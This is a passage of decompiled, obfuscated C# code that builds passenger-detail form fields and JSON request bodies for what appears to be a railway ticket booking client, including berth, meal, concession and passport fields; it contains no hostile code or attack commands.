using System;
using System.IO;
using System.Net;
using System.Security.Cryptography;
using System.Text;
using System.Web;
using System.Windows.Forms;
using Microsoft.VisualBasic;

internal class Class21
{
	internal string string_0;

	internal string string_1;

	internal string string_2;

	internal string string_3;

	internal string string_4;

	internal string string_5;

	internal string string_6;

	internal string string_7;

	public static byte[] byte_0;

	internal Class21()
	{
	}

	internal Class21(string string_8, string string_9, string string_10, string string_11, bool bool_0)
	{
		string_0 = string_8;
		string_1 = string_9;
		string_2 = string_10;
		string_3 = string_11;
		if (!bool_0)
		{
			string_4 = "";
			return;
		}
		string text = "SRCTZN";
		string_4 = text;
	}

	internal string method_0(int int_0, bool bool_0, bool bool_1, bool bool_2, bool bool_3, string string_8, string string_9, string string_10)
	{
		string text = "";
		string text2 = string_8;
		string oldValue = ":0";
		string text3 = ":";
		string_8 = text2.Replace(oldValue, text3 + int_0);
		string text4 = string_9;
		string oldValue2 = ":0";
		string text5 = ":";
		string_9 = text4.Replace(oldValue2, text5 + int_0);
		string text6 = string_2.ToUpper();
		string text7 = text6;
		if (string_10 != "")
		{
			string[] array = new string[1];
			string text8 = "&";
			array[0] = text8;
			string[] array2 = string_10.Split(array, StringSplitOptions.RemoveEmptyEntries);
			int num = Information.UBound(array2);
			for (int i = 0; i <= num; i++)
			{
				string expression = array2[i];
				string delimiter = "=";
				string[] array3 = Strings.Split(expression, delimiter);
				string text9 = array3[0];
				string value = "M";
				if (text9.Contains(value))
				{
					string text10 = text6;
					string oldValue3 = "M";
					text6 = text10.Replace(oldValue3, array3[1]);
					continue;
				}
				string text11 = array3[0];
				string value2 = "F";
				if (text11.Contains(value2))
				{
					string text12 = text6;
					string oldValue4 = "F";
					text6 = text12.Replace(oldValue4, array3[1]);
				}
			}
		}
		string[] array4 = new string[16];
		string text13 = "&";
		array4[0] = text13;
		array4[1] = string_8;
		string text14 = "=";
		array4[2] = text14;
		string text15 = string_0;
		string oldValue5 = "-";
		array4[3] = text15.Replace(oldValue5, "").Replace(' ', '+');
		string text16 = "&addPassengerForm%3Apsdetail%3A";
		array4[4] = text16;
		array4[5] = int_0.ToString();
		string text17 = "%3ApsgnAge=";
		array4[6] = text17;
		array4[7] = string_1;
		string text18 = "&";
		array4[8] = text18;
		array4[9] = string_9;
		string text19 = "=";
		array4[10] = text19;
		array4[11] = text6.ToUpper();
		string text20 = "&addPassengerForm%3Apsdetail%3A";
		array4[12] = text20;
		array4[13] = int_0.ToString();
		string text21 = "%3AberthChoice=";
		array4[14] = text21;
		array4[15] = smethod_2(string_3);
		string text22 = string.Concat(array4);
		string text23 = "";
		if (!bool_1)
		{
			if (bool_2)
			{
				string text24 = "&addPassengerForm%3Apsdetail%3A";
				string text25 = int_0.ToString();
				string text26 = "%3AbedRollOpt=on";
				text = text24 + text25 + text26;
			}
		}
		else
		{
			string text30;
			if (string.IsNullOrEmpty(string_5))
			{
				string text27 = "&addPassengerForm%3Apsdetail%3A";
				string text28 = int_0.ToString();
				string text29 = "%3AfoodChoice=V";
				text30 = text27 + text28 + text29;
			}
			else
			{
				string text31 = "&addPassengerForm%3Apsdetail%3A";
				string text32 = int_0.ToString();
				string text33 = "%3AfoodChoice=";
				text30 = text31 + text32 + text33 + string_5[0];
			}
			text = text30;
		}
		bool flag = !string.IsNullOrEmpty(string_4) && bool_0;
		string text34 = "";
		if (flag)
		{
			int num2 = 0;
			try
			{
				num2 = int.Parse(string_1);
			}
			catch
			{
			}
			if (!bool_3)
			{
				string text35 = "M";
				if (!(text7 == text35) || num2 < 60)
				{
					string text36 = "F";
					if (!(text7 == text36) || num2 < 58)
					{
						goto IL_0402;
					}
				}
				string text40;
				if (!string.IsNullOrEmpty(string_4))
				{
					string text37 = "&addPassengerForm%3Apsdetail%3A";
					string text38 = int_0.ToString();
					string text39 = "%3Aconcession=1";
					text40 = text37 + text38 + text39;
				}
				else
				{
					string text41 = "&addPassengerForm%3Apsdetail%3A";
					string text42 = int_0.ToString();
					string text43 = "%3Aconcession=3";
					text40 = text41 + text42 + text43;
				}
				text34 = text40;
			}
		}
		goto IL_0402;
		IL_0402:
		string text44 = ((!bool_0) ? "" : "");
		string text45 = string_0;
		string value3 = "-";
		if (text45.Contains(value3))
		{
			string text46 = "&addPassengerForm%3Apsdetail%3A";
			string text47 = int_0.ToString();
			string text48 = "%3AchildBerthOpt=on";
			text23 = text46 + text47 + text48;
		}
		object[] array5 = new object[7];
		string text49 = "&addPassengerForm%3Apsdetail%3A";
		array5[0] = text49;
		array5[1] = int_0;
		string text50 = "%3Anationality=IN&addPassengerForm%3Apsdetail%3A";
		array5[2] = text50;
		array5[3] = int_0;
		string text51 = "%3AidCardType=NULL_IDCARD&addPassengerForm%3Apsdetail%3A";
		array5[4] = text51;
		array5[5] = int_0;
		string text52 = "%3AidCardNumber=";
		array5[6] = text52;
		string text53 = string.Concat(array5);
		if (!string.IsNullOrEmpty(string_6))
		{
			string text54 = string_6;
			string value4 = "-IN";
			if (!text54.Contains(value4))
			{
				object[] array6 = new object[10];
				string text55 = "&addPassengerForm%3Apsdetail%3A";
				array6[0] = text55;
				array6[1] = int_0;
				string text56 = "%3Anationality=";
				array6[2] = text56;
				array6[3] = string_6.Substring(string_6.IndexOf('-') + 1);
				string text57 = "&addPassengerForm%3Apsdetail%3A";
				array6[4] = text57;
				array6[5] = int_0;
				string text58 = "%3AidCardType=PASSPORT&addPassengerForm%3Apsdetail%3A";
				array6[6] = text58;
				array6[7] = int_0;
				string text59 = "%3AidCardNumber=";
				array6[8] = text59;
				array6[9] = string_7;
				text53 = string.Concat(array6);
			}
		}
		return text22 + text + text34 + text44 + text23 + text53;
	}

	internal string method_1(int int_0)
	{
		string[] array = new string[12];
		string text = "&addPassengerForm%3AchildInfoTable%3A";
		array[0] = text;
		array[1] = int_0.ToString();
		string text2 = "%3AinfantName=";
		array[2] = text2;
		array[3] = string_0.Replace(' ', '+');
		string text3 = "&addPassengerForm%3AchildInfoTable%3A";
		array[4] = text3;
		array[5] = int_0.ToString();
		string text4 = "%3AinfantAge=";
		array[6] = text4;
		array[7] = string_1;
		string text5 = "&addPassengerForm%3AchildInfoTable%3A";
		array[8] = text5;
		array[9] = int_0.ToString();
		string text6 = "%3AinfantGender=";
		array[10] = text6;
		array[11] = string_2;
		return string.Concat(array);
	}

	internal static string smethod_0(int int_0, bool bool_0, bool bool_1, string string_8, string string_9)
	{
		string text = "";
		string text2 = string_8;
		string oldValue = ":0";
		string text3 = ":";
		string_8 = text2.Replace(oldValue, text3 + int_0);
		string text4 = string_9;
		string oldValue2 = ":0";
		string text5 = ":";
		string_9 = text4.Replace(oldValue2, text5 + int_0);
		string[] array = new string[9];
		string text6 = "&";
		array[0] = text6;
		array[1] = string_8;
		string text7 = "=&addPassengerForm%3Apsdetail%3A";
		array[2] = text7;
		array[3] = int_0.ToString();
		string text8 = "%3ApsgnAge=&";
		array[4] = text8;
		array[5] = string_9;
		string text9 = "=+&addPassengerForm%3Apsdetail%3A";
		array[6] = text9;
		array[7] = int_0.ToString();
		string text10 = "%3AberthChoice=++";
		array[8] = text10;
		string text11 = string.Concat(array);
		if (bool_1)
		{
			string text12 = "&addPassengerForm%3Apsdetail%3A";
			string text13 = int_0.ToString();
			string text14 = "%3AfoodChoice=+";
			text = text12 + text13 + text14;
		}
		object obj = ((!bool_0) ? "" : "");
		string[] array2 = new string[7];
		string text15 = "&addPassengerForm%3Apsdetail%3A";
		array2[0] = text15;
		array2[1] = int_0.ToString();
		string text16 = "%3Anationality=IN&addPassengerForm%3Apsdetail%3A";
		array2[2] = text16;
		array2[3] = int_0.ToString();
		string text17 = "%3AidCardType=NULL_IDCARD&addPassengerForm%3Apsdetail%3A";
		array2[4] = text17;
		array2[5] = int_0.ToString();
		string text18 = "%3AidCardNumber=";
		array2[6] = text18;
		object obj2 = string.Concat(array2);
		return string.Concat(text11, text, obj, obj2);
	}

	internal static string smethod_1(int int_0)
	{
		string[] array = new string[7];
		string text = "&addPassengerForm%3AchildInfoTable%3A";
		array[0] = text;
		array[1] = int_0.ToString();
		string text2 = "%3AinfantName=&addPassengerForm%3AchildInfoTable%3A";
		array[2] = text2;
		array[3] = int_0.ToString();
		string text3 = "%3AinfantAge=-1&addPassengerForm%3AchildInfoTable%3A";
		array[4] = text3;
		array[5] = int_0.ToString();
		string text4 = "%3AinfantGender=+";
		array[6] = text4;
		return string.Concat(array);
	}

	internal static string smethod_2(string string_8)
	{
		string text = string_8.ToUpper();
		switch (Class46.smethod_0(text))
		{
		case 879771736u:
		{
			string text8 = "MIDDLE";
			if (text == text8)
			{
				return "MB";
			}
			break;
		}
		case 207187383u:
		{
			string text3 = "SIDE LOWER";
			if (text == text3)
			{
				return "SL";
			}
			break;
		}
		case 1727073423u:
		{
			string text5 = "SIDE MIDDLE";
			if (text == text5)
			{
				return "SM";
			}
			break;
		}
		case 977910062u:
		{
			string text9 = "WINDOW SEAT";
			if (text == text9)
			{
				return "WS";
			}
			break;
		}
		case 2283022902u:
		{
			string text7 = "SIDE UPPER";
			if (text == text7)
			{
				return "SU";
			}
			break;
		}
		case 1902112077u:
		{
			string text6 = "NO CHOICE";
			_ = text == text6;
			return "++";
		}
		case 2906723303u:
		{
			string text4 = "UPPER";
			if (text == text4)
			{
				return "UB";
			}
			break;
		}
		case 2515996122u:
		{
			string text2 = "LOWER";
			if (text == text2)
			{
				return "LB";
			}
			break;
		}
		}
		return "++";
	}

	public string method_2(int int_0, bool bool_0, bool bool_1, bool bool_2, string string_8, bool bool_3)
	{
		int num = int_0;
		int_0++;
		int num2 = int.Parse(string_1);
		string text = "false";
		string text2 = text;
		string text3 = string_0;
		string value = "-";
		if (text3.Contains(value))
		{
			string text4 = "true";
			text2 = text4;
		}
		bool flag = num2 < 12;
		string text5 = "PT";
		if (flag & (string_8 == text5))
		{
			string text6 = "true";
			text2 = text6;
		}
		bool flag2 = num2 < 12;
		string text7 = text2;
		string text8 = "true";
		if (flag2 & (text7 != text8))
		{
			int_0--;
		}
		string text9 = text2;
		string text10 = "true";
		_ = text9 != text10;
		string text11 = "false";
		string text12 = text11;
		if (bool_3 && !string.IsNullOrEmpty(string_4) && !bool_0)
		{
			string text13 = "true";
			text12 = text13;
		}
		string text14 = "\"passengerFoodChoice\":null";
		string text15 = text14;
		if (bool_1)
		{
			string text16 = "V";
			string text17 = text16;
			string text18 = "\"passengerFoodChoice\":\"";
			string text19 = "\"";
			text15 = text18 + text17 + text19;
		}
		string text20 = "\"passengerBedrollChoice\":null";
		string text21 = text20;
		if (bool_2)
		{
			string text22 = "\"passengerBedrollChoice\":true";
			text21 = text22;
		}
		string text23 = "\"concessionOpted\":false";
		string text24 = text23;
		string text25 = "\"forGoConcessionOpted\":false";
		string text26 = text25;
		string text27 = text12;
		string text28 = "true";
		if (text27 == text28)
		{
			string text29 = "\"concessionOpted\":true";
			text24 = text29;
			string text30 = "\"forGoConcessionOpted\":false";
			text26 = text30;
		}
		object[] array = new object[52];
		string text31 = "{\"bookingBerthCode\":null,";
		array[0] = text31;
		string text32 = "\"bookingBerthNo\":0,";
		array[1] = text32;
		string text33 = "\"bookingCoachId\":null,";
		array[2] = text33;
		string text34 = "\"bookingStatus\":null,";
		array[3] = text34;
		string text35 = "\"bookingStatusDetails\":null,";
		array[4] = text35;
		string text36 = "\"bookingStatusIndex\":0,";
		array[5] = text36;
		string text37 = "\"cardIssueDate\":null,";
		array[6] = text37;
		string text38 = "\"childBerthFlag\":";
		string text39 = text2;
		string text40 = ",";
		array[7] = text38 + text39 + text40;
		string text41 = "\"childPassenger\":null,";
		array[8] = text41;
		string text42 = text24;
		string text43 = ",";
		array[9] = text42 + text43;
		string text44 = "\"currentBerthChoice\":null,";
		array[10] = text44;
		string text45 = "\"currentBerthCode\":null,";
		array[11] = text45;
		string text46 = "\"currentBerthNo\":0,";
		array[12] = text46;
		string text47 = "\"currentCoachId\":null,";
		array[13] = text47;
		string text48 = "\"currentStatus\":null,";
		array[14] = text48;
		string text49 = "\"currentStatusDetails\":null,";
		array[15] = text49;
		string text50 = "\"currentStatusIndex\":0,";
		array[16] = text50;
		string text51 = "\"dateOfBirth\":null,";
		array[17] = text51;
		string text52 = "\"error\":null,";
		array[18] = text52;
		string text53 = "\"foodChoice\":null,";
		array[19] = text53;
		string text54 = text26;
		string text55 = ",";
		array[20] = text54 + text55;
		string text56 = "\"insuranceIssued\":null,";
		array[21] = text56;
		string text57 = "\"memberType\":null,";
		array[22] = text57;
		string text58 = "\"mpID\":null,";
		array[23] = text58;
		string text59 = "\"passengerAge\":";
		string text60 = string_1;
		string text61 = ",";
		array[24] = text59 + text60 + text61;
		string text62 = text21;
		string text63 = ",";
		array[25] = text62 + text63;
		string text64 = "\"passengerBerthChoice\":\"";
		string text65 = smethod_3(string_3);
		string text66 = "\",";
		array[26] = text64 + text65 + text66;
		string text67 = "\"passengerCancellationDate\":null,";
		array[27] = text67;
		string text68 = "\"passengerCardNumber\":null,";
		array[28] = text68;
		string text69 = "\"passengerCardType\":null,";
		array[29] = text69;
		string text70 = "\"passengerConcCardNo\":null,";
		array[30] = text70;
		string text71 = "\"passengerConcession\":null,";
		array[31] = text71;
		string text72 = "\"passengerDynamicFare\":null,";
		array[32] = text72;
		string text73 = text15;
		string text74 = ",";
		array[33] = text73 + text74;
		string text75 = "\"passengerForceNumber\":null,";
		array[34] = text75;
		string text76 = "\"passengerGender\":\"";
		string text77 = string_2.ToUpper();
		string text78 = "\",";
		array[35] = text76 + text77 + text78;
		string text79 = "\"passengerIcardFlag\":false,";
		array[36] = text79;
		string text80 = "\"passengerName\":\"";
		string text81 = string_0;
		string oldValue = "-";
		string text82 = text81.Replace(oldValue, "");
		string text83 = "\",";
		array[37] = text80 + text82 + text83;
		string text84 = "\"passengerNationality\":\"IN\",";
		array[38] = text84;
		string text85 = "\"passengerNetFare\":null,";
		array[39] = text85;
		string text86 = "\"passengerSerialNumber\":";
		string text87 = num.ToString();
		string text88 = ",";
		array[40] = text86 + text87 + text88;
		string text89 = "\"policyNumber\":null,";
		array[41] = text89;
		string text90 = "\"psgnAmountDeducted\":null,";
		array[42] = text90;
		string text91 = "\"psgnAmountRefunded\":null,";
		array[43] = text91;
		string text92 = "\"psgnConcCardExpiryDate\":null,";
		array[44] = text92;
		string text93 = "\"psgnConcCardId\":\"\",";
		array[45] = text93;
		string text94 = "\"psgnConcDOB\":null,";
		array[46] = text94;
		string text95 = "\"psgnConcType\":null,";
		array[47] = text95;
		string text96 = "\"psgnwlType\":0,";
		array[48] = text96;
		string text97 = "\"secretariatType\":null,";
		array[49] = text97;
		string text98 = "\"softMemberFlag\":null,";
		array[50] = text98;
		string text99 = "\"softMemberId\":null}";
		array[51] = text99;
		return string.Concat(array);
	}

	public string method_3(int int_0, bool bool_0, bool bool_1, bool bool_2, string string_8, bool bool_3)
	{
		int num = 1;
		int num2 = int.Parse(string_1);
		string text = "false";
		string text2 = text;
		string text3 = "false";
		string text4 = text3;
		string text5 = string_0;
		string value = "-";
		if (text5.Contains(value))
		{
			string text6 = "true";
			text2 = text6;
		}
		bool flag = num2 < 12;
		string text7 = "PT";
		if (flag & (string_8 == text7))
		{
			string text8 = "true";
			text2 = text8;
		}
		bool flag2 = num2 < 12;
		string text9 = text2;
		string text10 = "true";
		if (flag2 & (text9 != text10))
		{
			num--;
		}
		string text11 = ",\"childBerthFlag\":true";
		string text12 = text11;
		string text13 = text2;
		string text14 = "true";
		if (text13 != text14)
		{
			string text15 = ",\"childBerthFlag\":false";
			text12 = text15;
		}
		if (bool_3 && !string.IsNullOrEmpty(string_4) && !bool_0)
		{
			string text16 = "true";
			text4 = text16;
		}
		string text17 = ",\"passengerFoodChoice\":null";
		string text18 = text17;
		if (bool_1)
		{
			if (!string.IsNullOrEmpty(string_5))
			{
				string text19 = string_5;
				string text20 = "No Food";
				if (text19 == text20)
				{
					string text21 = ",\"passengerFoodChoice\":\"D\"";
					text18 = text21;
				}
				else
				{
					string text22 = string_5;
					string text23 = "Veg";
					if (text22 == text23)
					{
						string text24 = ",\"passengerFoodChoice\":\"V\"";
						text18 = text24;
					}
					else
					{
						string text25 = string_5;
						string text26 = "Non-Veg";
						if (text25 == text26)
						{
							string text27 = ",\"passengerFoodChoice\":\"N\"";
							text18 = text27;
						}
					}
				}
			}
			else
			{
				string text28 = ",\"passengerFoodChoice\":\"D\"";
				text18 = text28;
			}
		}
		string text29 = ",\"passengerBedrollChoice\":null";
		string text30 = text29;
		if (bool_2)
		{
			string text31 = ",\"passengerBedrollChoice\":true";
			text30 = text31;
		}
		string result = "";
		string text32 = text4;
		string text33 = "true";
		_ = text32 == text33;
		string text34 = string_0;
		string oldValue = "-";
		if (!string.IsNullOrEmpty(text34.Replace(oldValue, "")))
		{
			string[] array = new string[15];
			string text35 = "{\"passengerName\":\"";
			array[0] = text35;
			string text36 = string_0;
			string oldValue2 = "-";
			array[1] = text36.Replace(oldValue2, "");
			string text37 = "\",\"passengerAge\":";
			array[2] = text37;
			array[3] = string_1;
			string text38 = ",\"passengerGender\":\"";
			array[4] = text38;
			array[5] = string_2;
			string text39 = "\",\"passengerBerthChoice\":\"";
			array[6] = text39;
			array[7] = smethod_3(string_3);
			string text40 = "\"";
			array[8] = text40;
			array[9] = text18;
			array[10] = text30;
			string text41 = ",\"passengerNationality\":\"IN\",\"passengerCardTypeMaster\":\"null\",\"passengerCardNumberMaster\":null,\"psgnConcType\":null,\"psgnConcCardId\":null,\"psgnConcDOB\":null,\"psgnConcCardExpiryDate\":null,\"psgnConcDOBP\":null,\"softMemberId\":null,\"softMemberFlag\":null,\"psgnConcCardExpiryDateP\":null,\"passengerVerified\":false,\"masterPsgnId\":null,\"mpMemberFlag\":null,\"passengerForceNumber\":null,\"passConcessionType\":\"0\",\"passUPN\":null,\"passBookingCode\":null,\"passengerSerialNumber\":";
			array[11] = text41;
			array[12] = int_0.ToString();
			array[13] = text12;
			string text42 = ",\"passengerCardType\":\"NULL_IDCARD\",\"passengerIcardFlag\":false,\"passengerCardNumber\":null}";
			array[14] = text42;
			result = string.Concat(array);
			string[] array2 = new string[14];
			string text43 = "{\"passengerName\":\"";
			array2[0] = text43;
			string text44 = string_0;
			string oldValue3 = "-";
			array2[1] = text44.Replace(oldValue3, "");
			string text45 = "\",\"passengerAge\":";
			array2[2] = text45;
			array2[3] = string_1;
			string text46 = ",\"passengerGender\":\"";
			array2[4] = text46;
			array2[5] = string_2;
			string text47 = "\",\"passengerBerthChoice\":\"";
			array2[6] = text47;
			array2[7] = smethod_3(string_3);
			string text48 = "\"";
			array2[8] = text48;
			array2[9] = text18;
			array2[10] = text30;
			string text49 = ",\"passengerNationality\":\"IN\",\"passengerCardTypeMaster\":\"NULL_IDCARD\",\"passengerCardNumberMaster\":null,\"psgnConcType\":null,\"psgnConcCardId\":null,\"psgnConcDOB\":null,\"psgnConcCardExpiryDate\":null,\"psgnConcDOBP\":null,\"softMemberId\":null,\"softMemberFlag\":null,\"psgnConcCardExpiryDateP\":null,\"passengerVerified\":false,\"masterPsgnId\":null,\"mpMemberFlag\":null,\"passengerForceNumber\":null,\"passConcessionType\":\"0\",\"passUPN\":null,\"passBookingCode\":null,\"passengerSerialNumber\":";
			array2[11] = text49;
			array2[12] = int_0.ToString();
			string text50 = ",\"childBerthFlag\":true,\"passengerCardType\":\"NULL_IDCARD\",\"passengerIcardFlag\":false,\"passengerCardNumber\":null}";
			array2[13] = text50;
			result = string.Concat(array2);
		}
		return result;
	}

	public string method_3_app(int int_0, bool bool_0, bool bool_1, bool bool_2, string string_8, bool bool_3)
	{
		int num = 1;
		int num2 = int.Parse(string_1);
		string text = "false";
		string text2 = text;
		string text3 = "false";
		string text4 = text3;
		string text5 = string_0;
		string value = "-";
		if (text5.Contains(value))
		{
			string text6 = "true";
			text2 = text6;
		}
		bool flag = num2 < 12;
		string text7 = "PT";
		if (flag & (string_8 == text7))
		{
			string text8 = "true";
			text2 = text8;
		}
		bool flag2 = num2 < 12;
		string text9 = text2;
		string text10 = "true";
		if (flag2 & (text9 != text10))
		{
			num--;
		}
		string text11 = ",\"childBerthFlag\":true";
		string text12 = text11;
		string text13 = text2;
		string text14 = "true";
		if (text13 != text14)
		{
			string text15 = ",\"childBerthFlag\":false";
			text12 = text15;
		}
		if (bool_3 && !string.IsNullOrEmpty(string_4) && !bool_0)
		{
			string text16 = "true";
			text4 = text16;
		}
		string text17 = "null";
		string text18 = text17;
		if (bool_1)
		{
			if (!string.IsNullOrEmpty(string_5))
			{
				string text19 = string_5;
				string text20 = "No Food";
				if (text19 == text20)
				{
					string text21 = "\"D\"";
					text18 = text21;
				}
				else
				{
					string text22 = string_5;
					string text23 = "Veg";
					if (!(text22 == text23))
					{
						string text24 = string_5;
						string text25 = "Non-Veg";
						if (text24 == text25)
						{
							string text26 = "\"N\"";
							text18 = text26;
						}
					}
					else
					{
						string text27 = "\"V\"";
						text18 = text27;
					}
				}
			}
			else
			{
				string text28 = "\"D\"";
				text18 = text28;
			}
		}
		string text29 = "false";
		string text30 = text29;
		if (bool_2)
		{
			string text31 = "true";
			text30 = text31;
		}
		string result = "";
		string text32 = "";
		string text33 = text4;
		string text34 = "true";
		if (text33 == text34)
		{
			string text35 = ",\"concessionOpted\":true";
			text32 = text35;
		}
		string text36 = string_0;
		string oldValue = "-";
		if (!string.IsNullOrEmpty(text36.Replace(oldValue, "")))
		{
			string[] array = new string[17];
			string text37 = "{\"berth_class_I\":null,\"berth_class_II\":null,\"bookingBerthCode\":null,\"bookingBerthNo\":0,\"bookingCoachId\":null,\"bookingStatus\":null,\"bookingStatusCode\":null,\"bookingStatusDetails\":null,\"bookingStatusIndex\":0,\"cardIssueDate\":null";
			array[0] = text37;
			array[1] = text12;
			string text38 = ",\"childPassenger\":null";
			array[2] = text38;
			array[3] = text32;
			string text39 = ",\"concessionOpted\":false,\"currentBerthChoice\":null,\"currentBerthCode\":null,\"currentBerthNo\":0,\"currentCoachId\":null,\"currentStatus\":null,\"currentStatusDetails\":null,\"currentStatusIndex\":0,\"dateOfBirth\":null,\"dropWaitlistFlag\":false,\"error\":null,\"fareChargedPercentage\":0.0,\"foodChoice\":null,\"forGoConcessionOpted\":false,\"hrmsTxnId\":null,\"insuranceIssued\":null,\"issuingAuthority\":null,\"issuingStation\":null,\"issuingZone\":null,\"memberType\":null,\"mpID\":null,\"passBookingCode\":null,\"passType\":null,\"passUPN\":null,\"passengerAge\":";
			array[4] = text39;
			array[5] = string_1;
			string text40 = ",\"passengerBedrollChoice\":\"";
			array[6] = text40;
			array[7] = text30;
			string text41 = "\",\"passengerBerthChoice\":null,\"passengerCancellationDate\":null,\"passengerCardNumber\":null,\"passengerCardType\":null,\"passengerConcession\":null,\"passengerDynamicFare\":null,\"passengerFoodChoice\":";
			array[8] = text41;
			array[9] = text18;
			string text42 = ",\"passengerForceNumber\":null,\"passengerGender\":\"";
			array[10] = text42;
			array[11] = string_2;
			string text43 = "\",\"passengerGenderCode\":null,\"passengerIcardFlag\":false,\"passengerName\":\"";
			array[12] = text43;
			string text44 = string_0;
			string oldValue2 = "-";
			array[13] = text44.Replace(oldValue2, "");
			string text45 = "\",\"passengerNationality\":\"IN\",\"passengerNetFare\":null,\"passengerSerialNumber\":";
			array[14] = text45;
			array[15] = int_0.ToString();
			string text46 = ",\"paymentValue\":null,\"policyNumber\":null,\"psgnAmountDeducted\":null,\"psgnAmountRefunded\":null,\"psgnConcCardExpiryDate\":null,\"psgnConcCardId\":\"\",\"psgnConcDOB\":null,\"psgnConcType\":null,\"psgnwlType\":0,\"secretariatType\":null,\"softMemberFlag\":null,\"softMemberId\":null,\"validationFlag\":\"N\",\"verificationStatus\":null,\"verificationStatusString\":null}";
			array[16] = text46;
			result = string.Concat(array);
		}
		return result;
	}

	public string method_31_app_OLD(int int_0, bool bool_0, bool bool_1, bool bool_2, string string_8, bool bool_3)
	{
		int num = 1;
		int num2 = int.Parse(string_1);
		string text = "false";
		string text2 = text;
		string text3 = "false";
		string text4 = text3;
		string text5 = string_0;
		string value = "-";
		if (text5.Contains(value))
		{
			string text6 = "true";
			text2 = text6;
		}
		bool flag = num2 < 12;
		string text7 = "PT";
		if (flag & (string_8 == text7))
		{
			string text8 = "true";
			text2 = text8;
		}
		bool flag2 = num2 < 12;
		string text9 = text2;
		string text10 = "true";
		if (flag2 & (text9 != text10))
		{
			num--;
		}
		string text11 = text2;
		string text12 = "true";
		_ = text11 != text12;
		if (bool_3 && !string.IsNullOrEmpty(string_4) && !bool_0)
		{
			string text13 = "true";
			text4 = text13;
		}
		if (bool_1 && !string.IsNullOrEmpty(string_5))
		{
			string text14 = string_5;
			string text15 = "No Food";
			if (!(text14 == text15))
			{
				string text16 = string_5;
				string text17 = "Veg";
				if (!(text16 == text17))
				{
					string text18 = string_5;
					string text19 = "Non-Veg";
					_ = text18 == text19;
				}
			}
		}
		string result = "";
		string text20 = text4;
		string text21 = "true";
		_ = text20 == text21;
		string text22 = string_0;
		string oldValue = "-";
		if (!string.IsNullOrEmpty(text22.Replace(oldValue, "")))
		{
			string[] array = new string[7];
			string text23 = "{\"berth_class_I\":null,\"berth_class_II\":null,\"bookingBerthCode\":null,\"bookingBerthNo\":0,\"bookingCoachId\":null,\"bookingStatus\":null,\"bookingStatusCode\":null,\"bookingStatusDetails\":null,\"bookingStatusIndex\":0,\"cardIssueDate\":null,\"childBerthFlag\":false,\"childPassenger\":null,\"concessionOpted\":false,\"currentBerthChoice\":null,\"currentBerthCode\":null,\"currentBerthNo\":0,\"currentCoachId\":null,\"currentStatus\":null,\"currentStatusDetails\":null,\"currentStatusIndex\":0,\"dateOfBirth\":null,\"dropWaitlistFlag\":false,\"error\":null,\"fareChargedPercentage\":0.0,\"foodChoice\":null,\"forGoConcessionOpted\":false,\"hrmsTxnId\":null,\"insuranceIssued\":null,\"issuingAuthority\":null,\"issuingStation\":null,\"issuingZone\":null,\"memberType\":null,\"mpID\":null,\"passBookingCode\":null,\"passType\":null,\"passUPN\":null,\"passengerAge\":";
			array[0] = text23;
			array[1] = string_1;
			string text24 = ",\"passengerBedrollChoice\":\"false\",\"passengerBerthChoice\":null,\"passengerCabinCoupe\":null,\"passengerCancellationDate\":null,\"passengerCardNumber\":null,\"passengerCardType\":null,\"passengerConcession\":null,\"passengerDynamicFare\":null,\"passengerFoodChoice\":null,\"passengerForceNumber\":null,\"passengerGender\":\"";
			array[2] = text24;
			array[3] = string_2;
			string text25 = "\",\"passengerGenderCode\":null,\"passengerIcardFlag\":false,\"passengerName\":\"";
			array[4] = text25;
			string text26 = string_0;
			string oldValue2 = "-";
			array[5] = text26.Replace(oldValue2, "");
			string text27 = "\",\"passengerNationality\":\"IN\",\"passengerNetFare\":null,\"passengerSerialNumber\":1,\"paymentValue\":null,\"policyNumber\":null,\"psgnAmountDeducted\":null,\"psgnAmountRefunded\":null,\"psgnConcCardExpiryDate\":null,\"psgnConcCardId\":\"\",\"psgnConcDOB\":null,\"psgnConcType\":null,\"psgnwlType\":0,\"secretariatType\":null,\"softMemberFlag\":null,\"softMemberId\":null,\"validationFlag\":\"N\",\"verificationStatus\":null,\"verificationStatusString\":null}";
			array[6] = text27;
			result = string.Concat(array);
			string[] array2 = new string[9];
			string text28 = "{\"currentStatus\":\"\",\"policyNumber\":\"\",\"needVerification\":false,\"bookingStatusDetails\":\"\",\"psgnConcDOB\":\"\",\"passengerSerialNumber\":";
			array2[0] = text28;
			array2[1] = int_0.ToString();
			string text29 = ",\"currentStatusIndex\":0,\"passengerNetFare\":0,\"passengerFoodChoice\":\"\",\"softMemberId\":0,\"psgnwlType\":0,\"isInfantWithBerth\":false,\"passengerCardNumber\":\"\",\"passengerName\":\"";
			array2[2] = text29;
			string text30 = string_0;
			string oldValue3 = "-";
			array2[3] = text30.Replace(oldValue3, "");
			string text31 = "\",\"childBerthFlag\":false,\"currentCoachId\":\"\",\"currentBerthChoice\":\"\",\"passengerAge\":";
			array2[4] = text31;
			array2[5] = string_1;
			string text32 = ",\"bookingCoachId\":\"\",\"passengerGender\":\"M\",\"bookingStatus\":\"\",\"passengerIcardFlag\":false,\"forGoConcessionOpted\":false,\"passengerNationality\":\"IN\",\"passengerCardStatus\":\"\",\"softMemberFlag\":false,\"psgnConcCardExpiryDate\":\"\",\"bookingBerthNo\":0,\"psgnConcCardId\":\"\",\"passengerBedrollChoice\":\"false\",\"currentBerthCode\":\"\",\"passengerCabinCoupe\":\"\",\"foodChoice\":\"\",\"passengerConcCardNo\":\"\",\"concessionOpted\":false,\"bookingBerthCode\":\"\",\"passengerCancellationDate\":\"\",\"railwayPassOpted\":false,\"passengerConcession\":\"\",\"mpID\":\"\",\"passengerCardType\":\"\",\"insuranceIssued\":\"\",\"psgnConcType\":\"GENERAL\",\"currentStatusDetails\":\"\",\"currentBerthNo\":0,\"childPassenger\":false,\"bookingStatusIndex\":0,\"passengerBerthChoice\":\"";
			array2[6] = text32;
			array2[7] = smethod_3(string_3);
			string text33 = "\"}";
			array2[8] = text33;
			result = string.Concat(array2);
		}
		return result;
	}

	public string method_31_app(int int_0, bool bool_0, bool bool_1, bool bool_2, string string_8, bool bool_3)
	{
		int num = 1;
		int num2 = int.Parse(string_1);
		string text = "false";
		string text2 = "false";
		if (string_0.Contains("-"))
		{
			text = "true";
		}
		if (num2 < 12 && string_8 == "PT")
		{
			text = "true";
		}
		if (num2 < 12 && text != "true")
		{
			num--;
		}
		if (bool_3 && !string.IsNullOrEmpty(string_4) && !bool_0)
		{
			text2 = "true";
		}
		if (!bool_1 || string.IsNullOrEmpty(string_5) || !(string_5 != "No Food") || !(string_5 != "Veg") || string_5 != "Non-Veg")
		{
		}
		string result = "";
		string text3 = string_0.Replace("-", "").Trim();
